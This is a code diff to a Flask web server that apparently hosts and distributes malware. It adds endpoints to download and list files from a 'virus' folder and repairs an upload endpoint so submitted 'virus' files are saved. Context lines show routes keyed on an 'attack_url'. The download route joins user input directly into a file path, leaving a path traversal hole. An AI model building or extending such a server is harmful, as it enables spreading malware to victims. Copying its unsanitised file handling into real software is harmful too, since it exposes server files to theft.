@@ -1,6 +1,6 @@
 
 import os
-from flask import Flask,request , Response
+from flask import Flask,request , Response, send_file
 from flask_cors import CORS
 import requests
 import hashlib
@@ -44,6 +44,10 @@ def get_random() -> str:
     else:
         return random_string
 
+@app.route('/get_virus/<file_name>')
+def get_virus(file_name):
+    return send_file("../virus/"+file_name, as_attachment=True, attachment_filename=file_name)
+
 @app.route('/push/<attack_url>/<message>')
 def get_message(attack_url,message):
 
@@ -62,6 +66,17 @@ def get_message(attack_url,message):
 
     else:
         return 'your message error'
+
+@app.route('/get_virus_list')
+def get_virus_list():
+    list_file = os.listdir('virus/')
+    content = ''
+    for i in list_file:
+        if os.path.isdir('virus/'+i) == True:
+            continue
+        content += i + '\n'
+
+    return content
 
 @app.route('/update_virus/<filename>' , methods=['POST'])
 def update_virus(filename):
@@ -86,8 +101,7 @@ def update_virus(filename):
         return 'MAX UPDATE: 10MB.'
 
     with open('virus/' + formatted_time+"-"+filename , "wb") as f:
-        f.write()
-    f.close()
+        f.write(data)
     return 'update ok.'
 
 @app.route('/<path:attack_url>')
